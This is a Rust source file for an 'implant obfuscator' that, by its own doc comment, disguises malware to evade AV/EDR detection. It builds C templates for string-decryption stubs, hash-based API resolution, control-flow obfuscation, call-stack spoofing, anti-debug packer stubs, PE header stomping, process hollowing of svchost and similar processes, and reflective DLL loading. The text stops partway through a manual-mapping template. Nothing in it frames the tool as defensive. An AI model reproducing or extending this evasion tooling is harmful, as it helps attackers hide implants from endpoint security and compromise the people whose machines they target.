use std::collections::HashMap;

use serde::{Deserialize, Serialize};

/// Obfuscation technique categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ObfuscationTechnique {
    StringEncryption,
    ApiHashing,
    ControlFlowObfuscation,
    PackerStub,
    PeHeaderStomp,
    ProcessHollowing,
    ReflectiveLoading,
}

impl std::fmt::Display for ObfuscationTechnique {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::StringEncryption => write!(f, "string-encryption"),
            Self::ApiHashing => write!(f, "api-hashing"),
            Self::ControlFlowObfuscation => write!(f, "control-flow-obfuscation"),
            Self::PackerStub => write!(f, "packer-stub"),
            Self::PeHeaderStomp => write!(f, "pe-header-stomp"),
            Self::ProcessHollowing => write!(f, "process-hollowing"),
            Self::ReflectiveLoading => write!(f, "reflective-loading"),
        }
    }
}

/// String encryption algorithms available.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum StringEncryptionAlgorithm {
    XorSingleByte,
    XorRollingKey,
    XorMultiKey,
    Rc4,
    Aes256Cbc,
    ChaCha20,
    Base64XorCombo,
}

impl std::fmt::Display for StringEncryptionAlgorithm {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::XorSingleByte => write!(f, "XOR-single-byte"),
            Self::XorRollingKey => write!(f, "XOR-rolling-key"),
            Self::XorMultiKey => write!(f, "XOR-multi-key"),
            Self::Rc4 => write!(f, "RC4"),
            Self::Aes256Cbc => write!(f, "AES-256-CBC"),
            Self::ChaCha20 => write!(f, "ChaCha20"),
            Self::Base64XorCombo => write!(f, "Base64+XOR-combo"),
        }
    }
}

/// API hashing algorithms for import hiding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ApiHashAlgorithm {
    Crc32,
    Djb2,
    FowlerNollVo,
    Ror13AddHash,
    Sdbm,
    JenkinsOneAtATime,
    MurmurHash3,
}

impl std::fmt::Display for ApiHashAlgorithm {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Crc32 => write!(f, "CRC32"),
            Self::Djb2 => write!(f, "DJB2"),
            Self::FowlerNollVo => write!(f, "FNV-1a"),
            Self::Ror13AddHash => write!(f, "ROR13-add"),
            Self::Sdbm => write!(f, "SDBM"),
            Self::JenkinsOneAtATime => write!(f, "Jenkins-OAT"),
            Self::MurmurHash3 => write!(f, "MurmurHash3"),
        }
    }
}

/// Control flow obfuscation pattern types.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ControlFlowPattern {
    OpaquePredicate,
    JunkCodeInsertion,
    FlattenedDispatch,
    BogusControlFlow,
    CallStackSpoofing,
    IndirectBranching,
}

impl std::fmt::Display for ControlFlowPattern {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::OpaquePredicate => write!(f, "opaque-predicate"),
            Self::JunkCodeInsertion => write!(f, "junk-code-insertion"),
            Self::FlattenedDispatch => write!(f, "flattened-dispatch"),
            Self::BogusControlFlow => write!(f, "bogus-control-flow"),
            Self::CallStackSpoofing => write!(f, "call-stack-spoofing"),
            Self::IndirectBranching => write!(f, "indirect-branching"),
        }
    }
}

/// Process hollowing target process types.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum HollowingTarget {
    Svchost,
    Explorer,
    RuntimeBroker,
    Notepad,
    Dllhost,
    WerFault,
    Consent,
    SearchProtocolHost,
}

impl std::fmt::Display for HollowingTarget {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Svchost => write!(f, "svchost.exe"),
            Self::Explorer => write!(f, "explorer.exe"),
            Self::RuntimeBroker => write!(f, "RuntimeBroker.exe"),
            Self::Notepad => write!(f, "notepad.exe"),
            Self::Dllhost => write!(f, "dllhost.exe"),
            Self::WerFault => write!(f, "WerFault.exe"),
            Self::Consent => write!(f, "consent.exe"),
            Self::SearchProtocolHost => write!(f, "SearchProtocolHost.exe"),
        }
    }
}

/// An encrypted string with decryption metadata.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptedString {
    pub original: String,
    pub encrypted_bytes: Vec<u8>,
    pub algorithm: StringEncryptionAlgorithm,
    pub key: Vec<u8>,
    pub decryption_stub: String,
}

/// An API function hash for import resolution at runtime.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApiHash {
    pub function_name: String,
    pub dll_name: String,
    pub hash_value: u32,
    pub algorithm: ApiHashAlgorithm,
    pub resolution_stub: String,
}

/// A control flow obfuscation transform.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ControlFlowTransform {
    pub pattern: ControlFlowPattern,
    pub description: String,
    pub code_template: String,
    pub entropy_increase: f64,
    pub performance_overhead_pct: f64,
}

/// Packer stub configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PackerStubConfig {
    pub compression_algorithm: String,
    pub encryption_algorithm: StringEncryptionAlgorithm,
    pub key_derivation: String,
    pub anti_debug_checks: Vec<String>,
    pub stub_template: String,
    pub estimated_size_overhead_pct: f64,
}

/// PE header stomping configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PeHeaderStompConfig {
    pub stomp_dos_header: bool,
    pub stomp_pe_signature: bool,
    pub stomp_optional_header: bool,
    pub stomp_section_headers: bool,
    pub preserve_entry_point: bool,
    pub command: String,
    pub description: String,
}

/// Process hollowing configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessHollowingConfig {
    pub target_process: HollowingTarget,
    pub create_suspended: bool,
    pub unmap_original: bool,
    pub api_sequence: Vec<String>,
    pub description: String,
    pub detection_risk: f64,
}

/// Reflective loading configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReflectiveLoadConfig {
    pub loader_type: ReflectiveLoaderType,
    pub description: String,
    pub api_calls: Vec<String>,
    pub code_template: String,
    pub detection_risk: f64,
}

/// Types of reflective loaders.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ReflectiveLoaderType {
    ReflectiveDll,
    ManualMap,
    ModuleStomping,
    TransactedHollowing,
    PhantomDll,
}

impl std::fmt::Display for ReflectiveLoaderType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ReflectiveDll => write!(f, "reflective-dll"),
            Self::ManualMap => write!(f, "manual-map"),
            Self::ModuleStomping => write!(f, "module-stomping"),
            Self::TransactedHollowing => write!(f, "transacted-hollowing"),
            Self::PhantomDll => write!(f, "phantom-dll"),
        }
    }
}

/// Complete obfuscation report for an implant.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ObfuscationReport {
    pub encrypted_strings: Vec<EncryptedString>,
    pub api_hashes: Vec<ApiHash>,
    pub control_flow_transforms: Vec<ControlFlowTransform>,
    pub packer_config: Option<PackerStubConfig>,
    pub pe_stomp_config: Option<PeHeaderStompConfig>,
    pub hollowing_configs: Vec<ProcessHollowingConfig>,
    pub reflective_configs: Vec<ReflectiveLoadConfig>,
    pub technique_coverage: HashMap<ObfuscationTechnique, usize>,
    pub estimated_av_evasion_score: f64,
}

/// Input implant description for obfuscation.
#[derive(Debug, Clone, Default)]
pub struct ImplantDescriptor {
    pub strings: Vec<String>,
    pub api_imports: Vec<(String, String)>,
    pub payload_size_bytes: u64,
    pub target_arch: TargetArch,
    pub is_dll: bool,
    pub is_windows: bool,
}

/// Target architecture.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TargetArch {
    X86,
    X64,
    Arm64,
}

impl Default for TargetArch {
    fn default() -> Self {
        Self::X64
    }
}

impl std::fmt::Display for TargetArch {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::X86 => write!(f, "x86"),
            Self::X64 => write!(f, "x64"),
            Self::Arm64 => write!(f, "ARM64"),
        }
    }
}

/// Configuration for the implant obfuscator.
#[derive(Debug, Clone)]
pub struct ImplantObfuscatorConfig {
    pub enable_string_encryption: bool,
    pub string_encryption_algorithm: StringEncryptionAlgorithm,
    pub enable_api_hashing: bool,
    pub api_hash_algorithm: ApiHashAlgorithm,
    pub enable_control_flow: bool,
    pub control_flow_patterns: Vec<ControlFlowPattern>,
    pub enable_packer: bool,
    pub enable_pe_stomp: bool,
    pub enable_process_hollowing: bool,
    pub enable_reflective_loading: bool,
    pub max_detection_risk: f64,
}

impl Default for ImplantObfuscatorConfig {
    fn default() -> Self {
        Self {
            enable_string_encryption: true,
            string_encryption_algorithm: StringEncryptionAlgorithm::XorRollingKey,
            enable_api_hashing: true,
            api_hash_algorithm: ApiHashAlgorithm::Djb2,
            enable_control_flow: true,
            control_flow_patterns: vec![
                ControlFlowPattern::OpaquePredicate,
                ControlFlowPattern::JunkCodeInsertion,
                ControlFlowPattern::FlattenedDispatch,
            ],
            enable_packer: true,
            enable_pe_stomp: true,
            enable_process_hollowing: true,
            enable_reflective_loading: true,
            max_detection_risk: 1.0,
        }
    }
}

/// Well-known Windows API functions commonly imported by implants.
const COMMON_IMPLANT_APIS: &[(&str, &str)] = &[
    ("kernel32.dll", "VirtualAlloc"),
    ("kernel32.dll", "VirtualProtect"),
    ("kernel32.dll", "CreateThread"),
    ("kernel32.dll", "WriteProcessMemory"),
    ("kernel32.dll", "ReadProcessMemory"),
    ("kernel32.dll", "OpenProcess"),
    ("kernel32.dll", "CreateRemoteThread"),
    ("kernel32.dll", "VirtualAllocEx"),
    ("kernel32.dll", "LoadLibraryA"),
    ("kernel32.dll", "GetProcAddress"),
    ("ntdll.dll", "NtCreateThreadEx"),
    ("ntdll.dll", "NtAllocateVirtualMemory"),
    ("ntdll.dll", "NtWriteVirtualMemory"),
    ("ntdll.dll", "NtProtectVirtualMemory"),
    ("ntdll.dll", "NtMapViewOfSection"),
    ("ntdll.dll", "NtUnmapViewOfSection"),
    ("wininet.dll", "InternetOpenA"),
    ("wininet.dll", "InternetConnectA"),
    ("wininet.dll", "HttpOpenRequestA"),
    ("wininet.dll", "HttpSendRequestA"),
    ("ws2_32.dll", "WSAStartup"),
    ("ws2_32.dll", "connect"),
    ("ws2_32.dll", "send"),
    ("ws2_32.dll", "recv"),
    ("advapi32.dll", "OpenProcessToken"),
    ("advapi32.dll", "AdjustTokenPrivileges"),
];

/// Obfuscates implant code to evade AV/EDR detection.
pub struct ImplantObfuscator {
    config: ImplantObfuscatorConfig,
}

impl ImplantObfuscator {
    pub fn new(config: ImplantObfuscatorConfig) -> Self {
        Self { config }
    }

    pub fn with_defaults() -> Self {
        Self::new(ImplantObfuscatorConfig::default())
    }

    /// Generate a full obfuscation report for the given implant.
    pub fn obfuscate(&self, implant: &ImplantDescriptor) -> ObfuscationReport {
        let mut technique_coverage: HashMap<ObfuscationTechnique, usize> = HashMap::new();

        let encrypted_strings = if self.config.enable_string_encryption {
            let strings = self.encrypt_strings(&implant.strings);
            *technique_coverage
                .entry(ObfuscationTechnique::StringEncryption)
                .or_insert(0) += strings.len();
            strings
        } else {
            Vec::new()
        };

        let api_hashes = if self.config.enable_api_hashing {
            let hashes = self.hash_api_imports(&implant.api_imports);
            *technique_coverage
                .entry(ObfuscationTechnique::ApiHashing)
                .or_insert(0) += hashes.len();
            hashes
        } else {
            Vec::new()
        };

        let control_flow_transforms = if self.config.enable_control_flow {
            let transforms = self.generate_control_flow_transforms();
            *technique_coverage
                .entry(ObfuscationTechnique::ControlFlowObfuscation)
                .or_insert(0) += transforms.len();
            transforms
        } else {
            Vec::new()
        };

        let packer_config = if self.config.enable_packer {
            let config = self.generate_packer_config(implant);
            *technique_coverage
                .entry(ObfuscationTechnique::PackerStub)
                .or_insert(0) += 1;
            Some(config)
        } else {
            None
        };

        let pe_stomp_config = if self.config.enable_pe_stomp && implant.is_windows {
            let config = self.generate_pe_stomp_config();
            *technique_coverage
                .entry(ObfuscationTechnique::PeHeaderStomp)
                .or_insert(0) += 1;
            Some(config)
        } else {
            None
        };

        let hollowing_configs = if self.config.enable_process_hollowing && implant.is_windows {
            let configs = self.generate_hollowing_configs();
            *technique_coverage
                .entry(ObfuscationTechnique::ProcessHollowing)
                .or_insert(0) += configs.len();
            configs
        } else {
            Vec::new()
        };

        let reflective_configs = if self.config.enable_reflective_loading && implant.is_dll {
            let configs = self.generate_reflective_configs();
            *technique_coverage
                .entry(ObfuscationTechnique::ReflectiveLoading)
                .or_insert(0) += configs.len();
            configs
        } else {
            Vec::new()
        };

        let evasion_score = self.estimate_evasion_score(&technique_coverage);

        ObfuscationReport {
            encrypted_strings,
            api_hashes,
            control_flow_transforms,
            packer_config,
            pe_stomp_config,
            hollowing_configs,
            reflective_configs,
            technique_coverage,
            estimated_av_evasion_score: evasion_score,
        }
    }

    /// Encrypt implant strings using the configured algorithm.
    fn encrypt_strings(&self, strings: &[String]) -> Vec<EncryptedString> {
        let mut results = Vec::new();

        for s in strings {
            let key =
                self.generate_key_for_algorithm(self.config.string_encryption_algorithm, s.len());
            let encrypted = self.xor_encrypt(s.as_bytes(), &key);
            let stub = self.generate_decryption_stub(self.config.string_encryption_algorithm, &key);

            results.push(EncryptedString {
                original: s.clone(),
                encrypted_bytes: encrypted,
                algorithm: self.config.string_encryption_algorithm,
                key: key.clone(),
                decryption_stub: stub,
            });
        }

        results
    }

    /// XOR encrypt bytes with a key (rolling).
    fn xor_encrypt(&self, data: &[u8], key: &[u8]) -> Vec<u8> {
        if key.is_empty() {
            return data.to_vec();
        }
        data.iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect()
    }

    /// Generate a key appropriate for the encryption algorithm.
    fn generate_key_for_algorithm(
        &self,
        algo: StringEncryptionAlgorithm,
        data_len: usize,
    ) -> Vec<u8> {
        match algo {
            StringEncryptionAlgorithm::XorSingleByte => vec![0x41],
            StringEncryptionAlgorithm::XorRollingKey => {
                let key_len = std::cmp::min(data_len, 16).max(4);
                (0..key_len).map(|i| ((i * 37 + 13) & 0xFF) as u8).collect()
            }
            StringEncryptionAlgorithm::XorMultiKey => {
                vec![0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE]
            }
            StringEncryptionAlgorithm::Rc4 => {
                (0..16).map(|i| ((i * 53 + 7) & 0xFF) as u8).collect()
            }
            StringEncryptionAlgorithm::Aes256Cbc => {
                (0..32).map(|i| ((i * 41 + 3) & 0xFF) as u8).collect()
            }
            StringEncryptionAlgorithm::ChaCha20 => {
                (0..32).map(|i| ((i * 59 + 11) & 0xFF) as u8).collect()
            }
            StringEncryptionAlgorithm::Base64XorCombo => {
                vec![0x42, 0x61, 0x73, 0x65]
            }
        }
    }

    /// Generate a decryption stub code template.
    fn generate_decryption_stub(&self, algo: StringEncryptionAlgorithm, key: &[u8]) -> String {
        match algo {
            StringEncryptionAlgorithm::XorSingleByte => {
                format!(
                    "// XOR single-byte decryption\n\
                     unsigned char key = 0x{:02X};\n\
                     for (int i = 0; i < len; i++) {{ buf[i] ^= key; }}",
                    key[0]
                )
            }
            StringEncryptionAlgorithm::XorRollingKey => {
                format!(
                    "// XOR rolling-key decryption\n\
                     unsigned char key[] = {{ {} }};\n\
                     int key_len = {};\n\
                     for (int i = 0; i < len; i++) {{ buf[i] ^= key[i % key_len]; }}",
                    key.iter()
                        .map(|b| format!("0x{:02X}", b))
                        .collect::<Vec<_>>()
                        .join(", "),
                    key.len()
                )
            }
            StringEncryptionAlgorithm::XorMultiKey => {
                "// XOR multi-key decryption (cascade)\n\
                 for (int round = 0; round < num_keys; round++) {\n\
                     for (int i = 0; i < len; i++) { buf[i] ^= keys[round][i % key_lens[round]]; }\n\
                 }"
                .to_string()
            }
            StringEncryptionAlgorithm::Rc4 => {
                "// RC4 decryption\n\
                 unsigned char S[256];\n\
                 for (int i = 0; i < 256; i++) S[i] = i;\n\
                 int j = 0;\n\
                 for (int i = 0; i < 256; i++) {\n\
                     j = (j + S[i] + key[i % key_len]) % 256;\n\
                     unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;\n\
                 }\n\
                 int i = 0; j = 0;\n\
                 for (int k = 0; k < len; k++) {\n\
                     i = (i + 1) % 256; j = (j + S[i]) % 256;\n\
                     unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;\n\
                     buf[k] ^= S[(S[i] + S[j]) % 256];\n\
                 }"
                .to_string()
            }
            _ => {
                format!(
                    "// {} decryption stub\n\
                     // Key length: {} bytes\n\
                     decrypt(buf, len, key, key_len);",
                    algo,
                    key.len()
                )
            }
        }
    }

    /// Hash API imports for runtime resolution.
    fn hash_api_imports(&self, imports: &[(String, String)]) -> Vec<ApiHash> {
        let mut results = Vec::new();

        for (dll, func) in imports {
            let hash_value = self.compute_api_hash(func, self.config.api_hash_algorithm);
            let stub = self.generate_hash_resolution_stub(dll, func, hash_value);

            results.push(ApiHash {
                function_name: func.clone(),
                dll_name: dll.clone(),
                hash_value,
                algorithm: self.config.api_hash_algorithm,
                resolution_stub: stub,
            });
        }

        results
    }

    /// Compute hash of a function name.
    fn compute_api_hash(&self, name: &str, algo: ApiHashAlgorithm) -> u32 {
        let bytes = name.as_bytes();
        match algo {
            ApiHashAlgorithm::Crc32 => {
                let mut crc: u32 = 0xFFFFFFFF;
                for b in bytes {
                    crc ^= *b as u32;
                    for _ in 0..8 {
                        if crc & 1 != 0 {
                            crc = (crc >> 1) ^ 0xEDB88320;
                        } else {
                            crc >>= 1;
                        }
                    }
                }
                crc ^ 0xFFFFFFFF
            }
            ApiHashAlgorithm::Djb2 => {
                let mut hash: u32 = 5381;
                for b in bytes {
                    hash = hash.wrapping_mul(33).wrapping_add(*b as u32);
                }
                hash
            }
            ApiHashAlgorithm::FowlerNollVo => {
                let mut hash: u32 = 0x811c9dc5;
                for b in bytes {
                    hash ^= *b as u32;
                    hash = hash.wrapping_mul(0x01000193);
                }
                hash
            }
            ApiHashAlgorithm::Ror13AddHash => {
                let mut hash: u32 = 0;
                for b in bytes {
                    hash = hash.rotate_right(13).wrapping_add(*b as u32);
                }
                hash
            }
            ApiHashAlgorithm::Sdbm => {
                let mut hash: u32 = 0;
                for b in bytes {
                    hash = (*b as u32)
                        .wrapping_add(hash.wrapping_shl(6))
                        .wrapping_add(hash.wrapping_shl(16))
                        .wrapping_sub(hash);
                }
                hash
            }
            ApiHashAlgorithm::JenkinsOneAtATime => {
                let mut hash: u32 = 0;
                for b in bytes {
                    hash = hash.wrapping_add(*b as u32);
                    hash = hash.wrapping_add(hash.wrapping_shl(10));
                    hash ^= hash.wrapping_shr(6);
                }
                hash = hash.wrapping_add(hash.wrapping_shl(3));
                hash ^= hash.wrapping_shr(11);
                hash = hash.wrapping_add(hash.wrapping_shl(15));
                hash
            }
            ApiHashAlgorithm::MurmurHash3 => {
                let mut h: u32 = 0x12345678;
                for chunk in bytes.chunks(4) {
                    let mut k: u32 = 0;
                    for (i, b) in chunk.iter().enumerate() {
                        k |= (*b as u32) << (i * 8);
                    }
                    k = k.wrapping_mul(0xcc9e2d51);
                    k = k.rotate_left(15);
                    k = k.wrapping_mul(0x1b873593);
                    h ^= k;
                    h = h.rotate_left(13);
                    h = h.wrapping_mul(5).wrapping_add(0xe6546b64);
                }
                h ^= bytes.len() as u32;
                h ^= h >> 16;
                h = h.wrapping_mul(0x85ebca6b);
                h ^= h >> 13;
                h = h.wrapping_mul(0xc2b2ae35);
                h ^= h >> 16;
                h
            }
        }
    }

    /// Generate stub for runtime API resolution via hash.
    fn generate_hash_resolution_stub(&self, dll: &str, func: &str, hash: u32) -> String {
        format!(
            "// Resolve {func} from {dll} via hash 0x{hash:08X}\n\
             HMODULE hMod = GetModuleHandleA(\"{dll}\");\n\
             if (!hMod) hMod = LoadLibraryA(\"{dll}\");\n\
             PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;\n\
             PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDos->e_lfanew);\n\
             DWORD expRVA = pNt->OptionalHeader.DataDirectory[0].VirtualAddress;\n\
             PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + expRVA);\n\
             DWORD* names = (DWORD*)((BYTE*)hMod + pExp->AddressOfNames);\n\
             WORD* ords = (WORD*)((BYTE*)hMod + pExp->AddressOfNameOrdinals);\n\
             DWORD* funcs = (DWORD*)((BYTE*)hMod + pExp->AddressOfFunctions);\n\
             for (DWORD i = 0; i < pExp->NumberOfNames; i++) {{\n\
                 char* name = (char*)((BYTE*)hMod + names[i]);\n\
                 if (hash_func(name) == 0x{hash:08X}) {{\n\
                     return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);\n\
                 }}\n\
             }}"
        )
    }

    /// Generate control flow obfuscation transforms.
    fn generate_control_flow_transforms(&self) -> Vec<ControlFlowTransform> {
        let mut transforms = Vec::new();

        for pattern in &self.config.control_flow_patterns {
            let (desc, template, entropy, overhead) = match pattern {
                ControlFlowPattern::OpaquePredicate => (
                    "Insert always-true/false predicates that are hard to determine statically".to_string(),
                    "// Opaque predicate: (x*x + x) is always even\n\
                     int x = GetTickCount();\n\
                     if ((x * x + x) % 2 == 0) {\n\
                         // Real code path (always taken)\n\
                         execute_payload();\n\
                     } else {\n\
                         // Dead code (never taken, but confuses static analysis)\n\
                         decoy_function();\n\
                     }".to_string(),
                    0.15,
                    5.0,
                ),
                ControlFlowPattern::JunkCodeInsertion => (
                    "Insert dead code blocks with plausible instructions between real operations".to_string(),
                    "// Junk code insertion\n\
                     volatile int dummy1 = 0x41424344;\n\
                     volatile int dummy2 = dummy1 ^ 0xDEADBEEF;\n\
                     __asm { nop; nop; nop; xchg eax, eax; };\n\
                     // ...real code continues...\n\
                     volatile int dummy3 = dummy2 + GetTickCount();\n\
                     (void)dummy3; // prevent optimization".to_string(),
                    0.25,
                    3.0,
                ),
                ControlFlowPattern::FlattenedDispatch => (
                    "Flatten control flow into a switch-based state machine dispatcher".to_string(),
                    "// Control flow flattening\n\
                     int state = INITIAL_STATE;\n\
                     while (state != EXIT_STATE) {\n\
                         switch (state) {\n\
                             case 0x1A3B: state = step_one(); break;\n\
                             case 0x4C5D: state = step_two(); break;\n\
                             case 0x6E7F: state = step_three(); break;\n\
                             case 0x8091: state = EXIT_STATE; break;\n\
                             default: state = ERROR_STATE; break;\n\
                         }\n\
                     }".to_string(),
                    0.35,
                    15.0,
                ),
                ControlFlowPattern::BogusControlFlow => (
                    "Clone basic blocks and insert conditional jumps between original and clone".to_string(),
                    "// Bogus control flow\n\
                     if (GetTickCount() > 0) { // always true at runtime\n\
                         real_block_A();\n\
                     } else {\n\
                         cloned_block_A_with_junk();\n\
                     }\n\
                     if ((GetCurrentProcessId() & 1) == (GetCurrentProcessId() & 1)) {\n\
                         real_block_B();\n\
                     } else {\n\
                         cloned_block_B_with_junk();\n\
                     }".to_string(),
                    0.3,
                    8.0,
                ),
                ControlFlowPattern::CallStackSpoofing => (
                    "Spoof the call stack to hide true caller origin from ETW/stack walk".to_string(),
                    "// Call stack spoofing via synthetic frames\n\
                     // Push fake return addresses that point to legitimate ntdll/kernel32 code\n\
                     void* spoofed_stack[] = {\n\
                         (void*)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlUserThreadStart\"),\n\
                         (void*)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"BaseThreadInitThunk\"),\n\
                     };\n\
                     // Set RBP chain to point through spoofed frames".to_string(),
                    0.2,
                    10.0,
                ),
                ControlFlowPattern::IndirectBranching => (
                    "Replace direct calls/jumps with indirect branches via function pointer tables".to_string(),
                    "// Indirect branching\n\
                     typedef void (*func_ptr_t)(void);\n\
                     func_ptr_t dispatch_table[] = { func_a, func_b, func_c, func_d };\n\
                     int idx = compute_index(input); // obfuscated index calculation\n\
                     dispatch_table[idx](); // indirect call".to_string(),
                    0.2,
                    7.0,
                ),
            };

            transforms.push(ControlFlowTransform {
                pattern: *pattern,
                description: desc,
                code_template: template,
                entropy_increase: entropy,
                performance_overhead_pct: overhead,
            });
        }

        transforms
    }

    /// Generate packer stub configuration.
    fn generate_packer_config(&self, implant: &ImplantDescriptor) -> PackerStubConfig {
        PackerStubConfig {
            compression_algorithm: "LZMA2".to_string(),
            encryption_algorithm: self.config.string_encryption_algorithm,
            key_derivation: "PBKDF2-HMAC-SHA256 (10000 iterations)".to_string(),
            anti_debug_checks: vec![
                "IsDebuggerPresent()".to_string(),
                "CheckRemoteDebuggerPresent()".to_string(),
                "NtQueryInformationProcess(ProcessDebugPort)".to_string(),
                "NtQueryInformationProcess(ProcessDebugObjectHandle)".to_string(),
                "NtQueryInformationProcess(ProcessDebugFlags)".to_string(),
                "NtQuerySystemInformation(SystemKernelDebuggerInformation)".to_string(),
                "RDTSC timing check".to_string(),
                "INT 2D anti-debug".to_string(),
            ],
            stub_template: format!(
                "// Packer stub for {} byte payload ({})\n\
                 // 1. Anti-debug checks\n\
                 // 2. Derive key from embedded seed via PBKDF2\n\
                 // 3. AES-256-CBC decrypt compressed payload\n\
                 // 4. LZMA2 decompress\n\
                 // 5. Allocate RWX memory via VirtualAlloc\n\
                 // 6. Copy decompressed payload\n\
                 // 7. VirtualProtect to RX\n\
                 // 8. Execute from entry point",
                implant.payload_size_bytes, implant.target_arch
            ),
            estimated_size_overhead_pct: 15.0,
        }
    }

    /// Generate PE header stomping configuration.
    fn generate_pe_stomp_config(&self) -> PeHeaderStompConfig {
        PeHeaderStompConfig {
            stomp_dos_header: true,
            stomp_pe_signature: true,
            stomp_optional_header: true,
            stomp_section_headers: true,
            preserve_entry_point: true,
            command: "// PE header stomping after loading\n\
                      DWORD oldProtect;\n\
                      VirtualProtect(hModule, 0x1000, PAGE_READWRITE, &oldProtect);\n\
                      // Zero DOS header (preserve e_lfanew for compatibility if needed)\n\
                      memset(hModule, 0, sizeof(IMAGE_DOS_HEADER));\n\
                      // Zero PE signature\n\
                      PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader.e_lfanew);\n\
                      memset(pNt, 0, sizeof(IMAGE_NT_HEADERS));\n\
                      // Zero section headers\n\
                      PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);\n\
                      memset(pSec, 0, sizeof(IMAGE_SECTION_HEADER) * numSections);\n\
                      VirtualProtect(hModule, 0x1000, oldProtect, &oldProtect);"
                .to_string(),
            description: "Zero PE headers in memory after loading to prevent memory scanning from identifying the module as a PE file. \
                          Breaks tools like Process Hacker module enumeration and memory-scanning AV signatures that match on PE headers."
                .to_string(),
        }
    }

    /// Generate process hollowing configurations for various target processes.
    fn generate_hollowing_configs(&self) -> Vec<ProcessHollowingConfig> {
        let targets = [
            (HollowingTarget::Svchost, 0.5),
            (HollowingTarget::RuntimeBroker, 0.4),
            (HollowingTarget::Dllhost, 0.35),
            (HollowingTarget::WerFault, 0.3),
        ];

        targets
            .iter()
            .filter(|(_, risk)| *risk <= self.config.max_detection_risk)
            .map(|(target, risk)| ProcessHollowingConfig {
                target_process: *target,
                create_suspended: true,
                unmap_original: true,
                api_sequence: vec![
                    format!("CreateProcessA(\"{}\", ..., CREATE_SUSPENDED, ...)", target),
                    "NtQueryInformationProcess(hProcess, ProcessBasicInformation, ...)".to_string(),
                    "ReadProcessMemory(hProcess, pbi.PebBaseAddress, ...)".to_string(),
                    "NtUnmapViewOfSection(hProcess, imageBase)".to_string(),
                    "VirtualAllocEx(hProcess, imageBase, imageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)".to_string(),
                    "WriteProcessMemory(hProcess, imageBase, payload, ...)".to_string(),
                    "SetThreadContext(hThread, &ctx) // Set RCX/EAX to new entry point".to_string(),
                    "ResumeThread(hThread)".to_string(),
                ],
                description: format!(
                    "Hollow {} — create suspended, unmap original image, \
                     write payload at original base, fix context, resume. \
                     Process appears legitimate in task manager.",
                    target
                ),
                detection_risk: *risk,
            })
            .collect()
    }

    /// Generate reflective loading configurations.
    fn generate_reflective_configs(&self) -> Vec<ReflectiveLoadConfig> {
        vec![
            ReflectiveLoadConfig {
                loader_type: ReflectiveLoaderType::ReflectiveDll,
                description: "Stephen Fewer's reflective DLL injection: the DLL contains its own \
                              loader function that maps itself into memory, resolves imports, \
                              and calls DllMain — no LoadLibrary needed."
                    .to_string(),
                api_calls: vec![
                    "VirtualAlloc".to_string(),
                    "NtFlushInstructionCache".to_string(),
                ],
                code_template: "// Reflective loader entry point\n\
                                // 1. Find base of raw DLL in memory\n\
                                // 2. Parse PE headers\n\
                                // 3. Allocate new region at preferred base\n\
                                // 4. Copy headers and sections\n\
                                // 5. Process relocations\n\
                                // 6. Resolve imports by walking PEB->Ldr\n\
                                // 7. Call TLS callbacks\n\
                                // 8. Call DllMain(DLL_PROCESS_ATTACH)\n\
                                ULONG_PTR WINAPI ReflectiveLoader(VOID) { ... }"
                    .to_string(),
                detection_risk: 0.5,
            },
            ReflectiveLoadConfig {
                loader_type: ReflectiveLoaderType::ManualMap,
                description:
                    "Manual mapping from injector process: the injector reads the DLL from \
                              disk/network, allocates memory in target, copies sections, processes \
                              relocations and imports, then calls entry point."
                        .to_string(),
                api_calls: vec![
                    "VirtualAllocEx".to_string(),
                    "WriteProcessMemory".to_string(),
                    "CreateRemoteThread".to_string(),
                ],
                code_template: "// Manual mapping (injector-side)\n\
                                // 1. Read PE file into local buffer\n\
                                // 2. VirtualAllocEx in target at preferred base\n\
